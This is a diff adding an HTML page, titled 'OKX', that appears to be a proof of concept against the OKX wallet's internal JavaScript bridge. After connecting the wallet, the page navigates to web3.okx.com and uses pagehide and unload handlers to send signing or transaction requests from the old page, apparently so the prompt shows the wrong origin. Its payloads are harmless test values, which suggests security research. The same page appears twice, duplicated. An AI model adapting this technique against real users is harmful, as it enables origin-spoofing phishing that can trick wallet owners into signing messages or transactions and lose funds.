@@ -1,0 +1,270 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta property="og:site_name" content="Example Domain">
+<title>OKX</title>
+<style>
+  body { max-width: 760px; margin: 2rem auto; padding: 0 1rem; font: 16px/1.5 system-ui; }
+  button { width: 100%; padding: .9rem; font: inherit; font-weight: 700; }
+  button:disabled { opacity: .55; }
+  pre { white-space: pre-wrap; word-break: break-word; background: #f4f4f4; padding: 1rem; }
+  .warning { border-left: 4px solid #b00020; padding-left: 1rem; }
+</style>
+
+
+<button id="sign">1. PAGEHIDE → PERSONAL_SIGN</button>
+<button id="tx">2. PAGEHIDE → ZERO-VALUE SELF TX</button>
+<pre id="log"></pre>
+
+<script>
+const TARGET = 'https://web3.okx.com/';
+const output = document.querySelector('#log');
+
+const log = (...parts) => {
+  output.textContent += `[${new Date().toISOString()}] ${parts.join(' ')}\n`;
+};
+
+function provider() {
+  return [window.okxwallet, window.okxwallet?.ethereum, window.ethereum]
+    .find(candidate => candidate && typeof candidate.request === 'function');
+}
+
+function timeout(promise, label, milliseconds = 180000) {
+  return Promise.race([
+    promise,
+    new Promise((_, reject) => setTimeout(
+      () => reject(new Error(`${label} did not settle in ${milliseconds / 1000}s`)),
+      milliseconds
+    ))
+  ]);
+}
+
+function utf8Hex(value) {
+  return '0x' + [...new TextEncoder().encode(value)]
+    .map(byte => byte.toString(16).padStart(2, '0'))
+    .join('');
+}
+
+function postPersonalSignFromOldDocument(trueRequester) {
+  const bridge = window.okxInternalJSBridge;
+  if (!bridge || typeof bridge.postMessage !== 'function') return;
+
+  const message = [
+    'OKX origin-binding security test.',
+    'No transaction, permit, token approval, or authentication is requested.',
+    `True requester: ${trueRequester}`,
+    'Expected displayed destination: https://example.com'
+  ].join('\n');
+
+  bridge.postMessage(JSON.stringify({
+    id: Date.now(),
+    name: 'signPersonalMessage',
+    object: { data: utf8Hex(message) }
+  }));
+}
+
+function postTransactionFromOldDocument(account) {
+  const bridge = window.okxInternalJSBridge;
+  if (!bridge || typeof bridge.postMessage !== 'function') return;
+
+
+  bridge.postMessage(JSON.stringify({
+    id: Date.now(),
+    name: 'sendTransaction',
+    object: {
+      from: account,
+      to: account,
+      value: '0x0',
+      data: '0x'
+    }
+  }));
+}
+
+async function run(kind) {
+  if (location.protocol !== 'https:') throw new Error('Host this page over HTTPS');
+  if (top !== self) throw new Error('Open this page top-level, not in an iframe');
+
+  const wallet = provider();
+  if (!wallet) throw new Error('Injected OKX provider was not found');
+
+  const trueRequester = location.origin;
+  log('True requester:', trueRequester);
+  log('Selected test:', kind);
+  log('Approve only the initial Connect dialog. Reject the later confirmation.');
+  const accounts = await timeout(wallet.request({
+    method: 'eth_requestAccounts',
+    params: []
+  }), 'eth_requestAccounts');
+  if (!Array.isArray(accounts) || !accounts.length) {
+    throw new Error('Connection returned no EVM account');
+  }
+  const account = accounts[0];
+  if (typeof window.okxInternalJSBridge?.postMessage !== 'function') {
+    throw new Error('Direct OKX bridge was not found');
+  }
+
+  let sent = false;
+  const sendOnce = () => {
+    if (sent) return;
+    sent = true;
+    if (kind === 'sign') {
+      postPersonalSignFromOldDocument(trueRequester);
+    } else {
+      postTransactionFromOldDocument(account);
+    }
+  };
+  addEventListener('pagehide', sendOnce, { once: true });
+  addEventListener('unload', sendOnce, { once: true });
+  log('Navigating; the old document will post', kind, 'during pagehide.');
+  location.replace(TARGET);
+}
+
+async function launch(kind, button) {
+  button.disabled = true;
+  output.textContent = '';
+  try {
+    await run(kind);
+  } catch (error) {
+    log('ERROR:', error?.stack || error?.message || String(error));
+    button.disabled = false;
+  }
+}
+
+document.querySelector('#sign').onclick = event => launch('sign', event.currentTarget);
+document.querySelector('#tx').onclick = event => launch('tx', event.currentTarget);
+</script>
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta property="og:site_name" content="Example Domain">
+<title>OKX</title>
+<style>
+  body { max-width: 760px; margin: 2rem auto; padding: 0 1rem; font: 16px/1.5 system-ui; }
+  button { width: 100%; padding: .9rem; font: inherit; font-weight: 700; }
+  button:disabled { opacity: .55; }
+  pre { white-space: pre-wrap; word-break: break-word; background: #f4f4f4; padding: 1rem; }
+  .warning { border-left: 4px solid #b00020; padding-left: 1rem; }
+</style>
+
+
+<button id="sign">1. PAGEHIDE → PERSONAL_SIGN</button>
+<button id="tx">2. PAGEHIDE → ZERO-VALUE SELF TX</button>
+<pre id="log"></pre>
+
+<script>
+const TARGET = 'https://web3.okx.com/';
+const output = document.querySelector('#log');
+
+const log = (...parts) => {
+  output.textContent += `[${new Date().toISOString()}] ${parts.join(' ')}\n`;
+};
+
+function provider() {
+  return [window.okxwallet, window.okxwallet?.ethereum, window.ethereum]
+    .find(candidate => candidate && typeof candidate.request === 'function');
+}
+
+function timeout(promise, label, milliseconds = 180000) {
+  return Promise.race([
+    promise,
+    new Promise((_, reject) => setTimeout(
+      () => reject(new Error(`${label} did not settle in ${milliseconds / 1000}s`)),
+      milliseconds
+    ))
+  ]);
+}
+
+function utf8Hex(value) {
+  return '0x' + [...new TextEncoder().encode(value)]
+    .map(byte => byte.toString(16).padStart(2, '0'))
+    .join('');
+}
+
+function postPersonalSignFromOldDocument(trueRequester) {
+  const bridge = window.okxInternalJSBridge;
+  if (!bridge || typeof bridge.postMessage !== 'function') return;
+
+  const message = [
+    'OKX origin-binding security test.',
+    'No transaction, permit, token approval, or authentication is requested.',
+    `True requester: ${trueRequester}`,
+    'Expected displayed destination: https://example.com'
+  ].join('\n');
+
+  bridge.postMessage(JSON.stringify({
+    id: Date.now(),
+    name: 'signPersonalMessage',
+    object: { data: utf8Hex(message) }
+  }));
+}
+
+function postTransactionFromOldDocument(account) {
+  const bridge = window.okxInternalJSBridge;
+  if (!bridge || typeof bridge.postMessage !== 'function') return;
+
+
+  bridge.postMessage(JSON.stringify({
+    id: Date.now(),
+    name: 'sendTransaction',
+    object: {
+      from: account,
+      to: account,
+      value: '0x0',
+      data: '0x'
+    }
+  }));
+}
+
+async function run(kind) {
+  if (location.protocol !== 'https:') throw new Error('Host this page over HTTPS');
+  if (top !== self) throw new Error('Open this page top-level, not in an iframe');
+
+  const wallet = provider();
+  if (!wallet) throw new Error('Injected OKX provider was not found');
+
+  const trueRequester = location.origin;
+  log('True requester:', trueRequester);
+  log('Selected test:', kind);
+  log('Approve only the initial Connect dialog. Reject the later confirmation.');
+  const accounts = await timeout(wallet.request({
+    method: 'eth_requestAccounts',
+    params: []
+  }), 'eth_requestAccounts');
+  if (!Array.isArray(accounts) || !accounts.length) {
+    throw new Error('Connection returned no EVM account');
+  }
+  const account = accounts[0];
+  if (typeof window.okxInternalJSBridge?.postMessage !== 'function') {
+    throw new Error('Direct OKX bridge was not found');
+  }
+
+  let sent = false;
+  const sendOnce = () => {
+    if (sent) return;
+    sent = true;
+    if (kind === 'sign') {
+      postPersonalSignFromOldDocument(trueRequester);
+    } else {
+      postTransactionFromOldDocument(account);
+    }
+  };
+  addEventListener('pagehide', sendOnce, { once: true });
+  addEventListener('unload', sendOnce, { once: true });
+  log('Navigating; the old document will post', kind, 'during pagehide.');
+  location.replace(TARGET);
+}
+
+async function launch(kind, button) {
+  button.disabled = true;
+  output.textContent = '';
+  try {
+    await run(kind);
+  } catch (error) {
+    log('ERROR:', error?.stack || error?.message || String(error));
+    button.disabled = false;
+  }
+}
+
+document.querySelector('#sign').onclick = event => launch('sign', event.currentTarget);
+document.querySelector('#tx').onclick = event => launch('tx', event.currentTarget);
+</script>
